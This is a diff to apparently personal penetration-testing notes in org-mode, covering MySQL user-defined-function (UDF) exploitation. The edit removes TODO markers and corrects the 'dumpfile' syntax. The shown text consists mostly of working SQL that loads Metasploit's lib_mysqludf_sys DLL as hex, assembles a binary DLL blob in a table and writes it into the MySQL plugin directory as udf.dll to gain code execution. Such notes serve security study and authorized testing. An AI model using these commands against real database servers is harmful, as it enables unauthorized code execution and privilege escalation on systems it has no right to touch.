@@ -3398,8 +3398,7 @@ EOF
 ** Targeting the Database
    + check version. If updated, check else.
      
-*** TODO Application/Service Enumeration (mysql udf exploit)
-    + TODO: try udf
+*** Application/Service Enumeration (mysql udf exploit)
     + requirement: Write permission
     + ref(mysql-UDF): [[./ref/b3cp24_44139-mysql-udf-exploitation.pdf][mysql-udf-exploitation]]
     + info:
@@ -3409,7 +3408,7 @@ EOF
 select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.hex';
         /* (ref p7) */
         #+end_src
-      - or write binary to a table (or select $binary into dump file "$plugin_dir"?)
+      - or write binary to a table (or select $binary into dumpfile "$plugin_dir"?)
       #+begin_src sql
 create table temp(data longblob);
 insert into temp(data) values 
@@ -3420,7 +3419,7 @@ update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a
 83b369f112b376a383b35269636877a383b30000000000000000000000000000000050450000648606007
 0b1834b00000000);
 
-select data from temp into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21- winx64\\lib\\plugin\\udf.dll";
+select data from temp into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21- winx64\\lib\\plugin\\udf.dll";
       #+end_src
       - or use to_base64 function > MySQL 5.6.1/MariaDB 10.0.5
       #+begin_src sql
